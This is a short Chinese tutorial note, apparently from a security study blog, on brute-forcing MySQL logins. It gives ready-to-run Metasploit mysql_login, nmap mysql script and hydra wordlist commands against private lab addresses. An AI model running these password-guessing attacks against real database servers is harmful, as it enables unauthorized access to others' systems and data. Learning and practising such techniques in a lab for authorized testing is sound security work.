---
title: "MYSQL 爆破"
date: 2019-01-02T00:15:57+08:00
tags: [""]
categories: ["工具使用接口", "Kali"]
---

> ​	学习地址：
>
> - https://xz.aliyun.com/t/1652


## 使用 metasploit

启动 metasploit：

```shell
$ msfconsole
```

使用 `auxiliary/scanner/mysql/mysql_login` 模块进行：

可以单一扫描验证登录验证：

```shell
use auxiliary/scanner/mysql/mysql_login
set rhosts <ip-address>
set username root
set password 11111111
run
```

使用某个字典进行爆破：

```shell
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <ip-address>
set pass_file “/root/top10000pwd.txt”
set username root
run
```

## nmap 扫描

可以查看所有与 `mysql` 相关的脚本：

```shell
$ ls -al /usr/share/nmap/scripts/mysql*
```

先查看是否开启了端口

```shell
$ nmap <ip-address>
```

扫描空口令：

```shell
$ nmap -p3306 --script=mysql-empty-password.nse 192.168.137.130
```

扫描已知口令：

```shell
$ nmap -sV --script=mysql-databases --script-args dbuser=root,dbpass=11111111 192.168.195.130
```

## xHydra 和 Hydras

使用字典进行爆破：

```shell
$ hydra -l root -P /root/Desktop/top10000pwd.txt -t 16 192.168.157.130 mysql
```


